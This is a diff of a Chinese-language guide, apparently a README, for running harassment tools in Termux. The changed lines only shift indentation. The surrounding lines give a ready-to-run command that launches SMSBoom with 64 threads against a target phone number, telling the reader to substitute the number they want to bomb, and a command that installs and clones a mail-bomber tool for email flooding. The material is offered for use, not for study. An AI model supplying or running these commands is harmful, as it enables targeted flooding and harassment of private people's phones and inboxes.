@@ -1,4 +1,4 @@
-  ## 概述
+    ## 概述
   
 - 如果你还没有下载termux可以点击[这里](https://f-droid.org/en/packages/com.termux/)
 - 若你没有科学环境可以自行搜索下载，或者点击[这里](https://m.youxibao.com/app/15333.html)
@@ -16,7 +16,7 @@
   `cd SMSBoom;python smsboom.py run -t 64 -p 184****9269 -f 60 `
   将手机号替换为你需要轰炸的手机号
 
- ### 邮箱轰炸
+  ### 邮箱轰炸
  `pkg install git && pkg install php && git clone https://github.com/cat-bucket/mail-bomber && cd mail-bomber && `
  
 
